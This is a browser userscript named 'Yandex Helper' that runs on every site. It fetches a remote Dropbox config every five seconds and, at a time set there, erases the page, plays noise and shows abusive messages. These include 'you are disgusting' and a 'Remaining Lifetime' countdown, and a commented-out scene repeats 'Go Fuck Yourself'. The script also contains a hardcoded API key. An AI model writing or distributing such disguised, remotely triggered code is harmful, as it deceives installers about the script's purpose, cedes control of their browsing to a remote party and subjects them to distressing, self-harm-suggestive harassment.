// ==UserScript==
// @name         Yandex Helper
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        */*
// @grant        GM.xmlHttpRequest
// @grant        GM.getResourceURL
// @connect dl.dropboxusercontent.com
// ==/UserScript==

function shuffle(a) {
    var j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}

function Destroy_Page_With_VideoBG(audio_url, video_search_tags, pages_load, content_inner_html, update_callback){
    document.title = "?"

    function destroy_all_audio(){
        [].forEach.call(document.querySelectorAll("*"), function(x){if(x.tagName=="AUDIO" || x.tagName=="SOURCE"){try{x.parentNode.parentNode.remove();}catch(e){}}})
    }
    destroy_all_audio()
    var time = 0

    var new_font = new FontFace('congress', 'url(https://dl.dropboxusercontent.com/s/geosla34jgrxqw7/Arvo-Bold.ttf)')
    new_font.load().then(function(loaded_face) {
    // use font here
        document.fonts.add(loaded_face)
    }).catch(function(error) {

    });
    
    
    var videos = []
    for(var i=0; i<pages_load; i++){
        fetch(
            `https://api.pexels.com/videos/search?query=${video_search_tags}&page=${(i+1)}`
            , {
            headers: {Authorization: "563492ad6f9170000100000170960fe8a10846e09dec6e61436679f3"}
            }
        ).then(resp=>{
            return resp.json()
        }).then(data=>{
            data = data.videos.map(x=>x.video_files.sort((a, b)=>{
                if(a.width>b.width){
                    return -1;
                }
                if(a.width<b.width){
                    return 1;
                }}))
            videos = videos.concat(data.map(x=>x.filter(v=>v.width<=2660)[0].link))
            videos = shuffle(videos);
        })
    }
    

    var last_video = 0

    var music = new Audio(audio_url)
    music.loop = true
    music.play()

    var main_content_setup = false

    var animation_interval = ()=>{
        if(time<24){
            document.body.style.filter = `grayscale(${time/10}) contrast(${1+time/10}) blur(${time/5}px)`
        }else
        if(time>24 && !main_content_setup){
            document.body.style.fontFamily = "congress"
            document.body.style.overflowY = "hidden"
            document.body.style.filter = ``
            document.body.style.background = "#000"
            document.body.innerHTML = ""
            var lifetime = "00:00:00"
            document.body.innerHTML = `
            <video id="bg_video" style="z-index: -1; position: absolute; width:100%; filter: grayscale(0.9) brightness(0.4) contrast(1.5);" autoplay muted loop id="myVideo">
                <source id="bg_video_source" src="${videos[0]}" type="video/mp4">
            </video>
            <div style="display: flex; position: absolute; width: 100%; height: 100%; align-items: center; justify-content: center;">
                <div style="display: block; text-align: center;">
                    ${content_inner_html}
                </div>
            </div>
            `
            main_content_setup = true
        }else if(time>24){
            update_callback()
            
            var current_video = Math.floor((time-24)/30) % videos.length
            if(last_video != current_video){
                console.log(current_video)
                last_video = current_video
                var video_el = document.getElementById("bg_video")
                //video_el.pause()
                document.getElementById("bg_video_source").src = videos[current_video]

                video_el.load()
                video_el.play()
            }
        }
        time += 0.1
        window.requestAnimationFrame(animation_interval)
    }
    animation_interval()
}


function get_close_config(callback){
    let xhr = new XMLHttpRequest();
    var url = "https://dl.dropboxusercontent.com/s/so0u91mqtdg3cqg/tab_close_config.json"

    GM.xmlHttpRequest({
        method: 'GET',
        url: url,
        responseType: 'json',
        onload: function (resp) {
            callback(resp.response)
        },
        onerror: function (resp) {
            console.log(resp.statusText);
        },
    })
    //fetch(url).then(function(response){
    //    response.json().then(function(data){
    //        callback(data)
    //    })
    //})
}

function* pseudoRandom(seed) {
    let value = seed;

    while(true) {
        value = value * 16807 % 2147483647
        yield value;
    }

};

function FuckYourself_DestroyPage(noise_audio){
    let generator = pseudoRandom(1)
    var super_words = ["Fuck", "Kill", "Humiliate"];
    noise_audio.play();
    [].forEach.call(document.querySelectorAll("*"), function(x){if(x.tagName!="BODY" && x.tagName!="HTML"){try{x.remove();}catch(e){}}})
    document.body.style.backgroundColor = "#000"
    document.body.style.backgroundImage = "url(https://25.media.tumblr.com/tumblr_m2tnydjxke1qg39ewo1_500.gif)"
    var timer = 0
    setInterval(function(){
        document.body.innerHTML = ""
        for(var t=0; t<50; t++){
            var dots = ""
            for(var i=0; i<Math.round((Math.sin((timer+t/3))+1)*5); i++) dots += "."
            var super_word = super_words[Math.floor(t*1)%super_words.length]
            document.body.innerHTML += `<h1 style="${(t%2==0 ? "" : "text-align:right;")} color: #ff3232; padding-left:2em;">${("Go "+super_word+" Yourself").split("").map((x, i)=> i>0 ? (dots+x) : x).join("")}</h1>`
        }
        timer += 0.04
    }, 10)
}

var scenes = {
    lifetime: {
        destroy_page: ()=>{
            function fixed_zeros_num(num, length){
                num = num.toString()
                var text = ""
                for(var i=0; i<(length-num.length); i++){
                    text += "0"
                }
                text+=num
                return text
            }

            var next_day = new Date()
            next_day = new Date(next_day.getFullYear(), next_day.getMonth(), next_day.getDate()+1)
            function get_lifetime_text(){
                var life_time = new Date(next_day - (new Date()))
                return `${fixed_zeros_num(life_time.getHours(), 2)}:${fixed_zeros_num(life_time.getMinutes(), 2)}:${fixed_zeros_num(life_time.getSeconds(), 2)}:${fixed_zeros_num(life_time.getMilliseconds(), 3)}`
            }

            Destroy_Page_With_VideoBG(
                "https://t4.bcbits.com/stream/edb7076d22ba1e03e79b8c06ffb9dca1/mp3-128/776737745?p=0&ts=1616249791&t=6933124e242c0362e31fdcc816516d6aabbf4169&token=1616249791_b9bfd12c86ad852236f4d31d8ac6ee53abe46d0d",
                "life",
                5,
                `
                <div style="font-size: 1.5em; color: rgb(255 255 255 / 60%); font-family: congress">you are disgusting</div>
                <div style="font-size: 3em; color: rgb(255 255 255 / 75%); font-family: congress">Fortunately, Your Remaining Lifetime is:</div>
                <div style="font-size: 5em; color:#fff; font-family: congress" id="lifetime_text">${get_lifetime_text()}</div>
                `,
                function (){
                    document.getElementById("lifetime_text").innerHTML = get_lifetime_text()
                }
            )
        }
    }
}

function Destroy_Page_by_Scene(scene_name){
    try{
        scenes[scene_name].destroy_page()
    }catch(e){
        document.body.innerHTML = ""
    }
}

function start_checking(){
    var check_interval = null
    var noise_audio = new Audio("https://dl.dropboxusercontent.com/s/87tn8z5nu4a3aw3/noise_1.wav")
    noise_audio.loop = true
    check_interval = setInterval(function(){
        get_close_config(function(data){
            var close_time = data["close_time"]
            var date = new Date()
            var current_time = date.getHours()*60*60 + date.getMinutes()*60 + date.getSeconds()
            console.log(close_time)
            if(current_time >= close_time && current_time < close_time + 60*2){
                clearInterval(check_interval)
                Destroy_Page_by_Scene(data["scene_name"])
                //FuckYourself_DestroyPage(noise_audio)
            }
        })
    }, 5000)
}


// End.
